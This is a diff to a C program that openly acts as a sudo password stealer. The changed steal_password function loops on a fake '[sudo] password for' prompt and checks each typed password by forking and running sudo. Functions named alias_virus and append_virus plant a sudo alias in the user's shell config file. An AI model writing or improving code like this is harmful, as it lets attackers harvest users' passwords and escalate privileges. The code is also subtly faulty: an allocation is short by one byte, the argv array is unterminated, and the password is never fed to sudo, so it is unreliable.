@@ -5,6 +5,7 @@
 #include <pwd.h>
 #include <string.h>
 #include <fcntl.h>
+#include <sys/wait.h>
 #include "pseudo.h"
 #include <signal.h>
 
@@ -48,6 +49,8 @@ int main(int argc, char ** argv){
 
   while(1){};
 
+  return 0;
+
 }
 
 
@@ -55,26 +58,33 @@ int get_username(char * uname){
   uid_t uid = getuid();
   struct passwd *pw = getpwuid(uid);
   strcpy(uname, pw -> pw_name);
+
+  return 0;
 }
 
 int steal_password(char * passwd, char * username){
   get_username(username);
 
   char prompt[UNAME_SIZE + 32];
-  sprintf(prompt,"[sudo] password for %s: ", username);
+  int correctPasswd = 0;
+  while (! correctPasswd){
+    sprintf(prompt,"[sudo] password for %s: ", username);
 
-  char * returned_pass = getpass(prompt);
+    // This command prints the prompt to stdout then reads in the user's input without it showing up on the terminal (like sudo)
+    char * returned_pass = getpass(prompt);
 
-  // returned_pass[strlen(returned_pass)] = 0;
+    // returned_pass[strlen(returned_pass)] = 0;
 
-  strcpy(passwd, returned_pass);
+    strcpy(passwd, returned_pass);
 
-  free(returned_pass);
-
-  if(strlen(passwd)==0){
-    printf("sudo: a password is required\n");
-    exit(1);
+    // If sudo works with password, we know we have the right password
+    if (testSudoPassword(passwd) == 0){
+      correctPasswd = 1;
+    }
+    free(returned_pass);
   }
+
+  return 0;
 }
 
 int alias_virus(){
@@ -108,6 +118,8 @@ int alias_virus(){
 
   // printf("sucess\n");
 
+  return 0;
+
 }
 
 int append_virus(char * home_dir, char * config_file, char * alias){
@@ -132,10 +144,47 @@ int append_virus(char * home_dir, char * config_file, char * alias){
 
   close(fd);
 
+  return 0;
+
 }
 
 
-//args is what goes into the sudo -- example args ={echo,test}
-int execute_sudo_cmd(char * args){
+int testSudoPassword(char * passwd){
+  // The first three command line arguments are path to file, SUDO, sudo
+  char ** fillerArray = (char**)calloc(1, sizeof(char*));
+  *(fillerArray) = (char*)malloc(strlen("sudo")*sizeof(char));
+  strcpy(*(fillerArray), "sudo");
 
+  return runSudo(passwd, fillerArray);
+
+}
+
+// Runs sudo with given arguments and returns 0 if successful, something else if not
+int runSudo(char * passwd, char ** argAry){
+  int forkResult = fork();
+
+  // Parent waits for child, returns result of child's sudo
+  if (forkResult > 0){
+    int status = 0;
+    wait(&status);
+
+    int result = WEXITSTATUS(status);
+
+    printf("result: %d\n", result);
+
+    return result;
+  }
+
+  // Child runs sudo
+  if (forkResult == 0){
+
+    printf("Running sudo\n");
+    int execResult = execvp(*(argAry), argAry);
+    if (execResult == -1){
+      printf("Execvp failed to run sudo\n");
+    }
+  }
+
+  // Unreachable
+  return 0;
 }
